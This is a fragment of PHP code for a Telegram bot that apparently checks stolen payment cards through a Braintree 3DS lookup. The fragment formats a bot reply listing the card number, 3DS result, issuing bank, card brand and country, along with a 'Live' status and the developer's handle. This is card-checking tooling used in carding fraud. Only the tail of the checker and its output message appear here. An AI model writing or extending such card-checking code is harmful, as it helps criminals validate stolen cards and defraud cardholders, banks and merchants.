   $es = "authenticate_frictionless_failed";
 } 

$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
//=============CHECKER END=============//
bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtovbv,
'text'=>"<b>
BRAINTREE 3ds Lookup 🌩
━━━━━━━━━━━━━
[ϟ]Card: <code>$lista</code> 
[ϟ]Status:<code> $msg<code>
[ϟ]Result:<code> $es <code>

[ϟ]Brand: <code>$level-$brand</code>
[ϟ]Type: <code>$type</code>
[ϟ]Bank: <code>$bank</code>
[ϟ]Country: <code>$country_name [$country_flag]</code>

[ϟ]Time: <code>$time SEC</code> | IP: <code>Live ✅</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ]Req: <b>@$username</b> [$rank]
[ϟ]Dev: <code>@celestial_being</code>

</b>",
      'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'

            ]);
recordBotResponseTimestamp($userId);

}
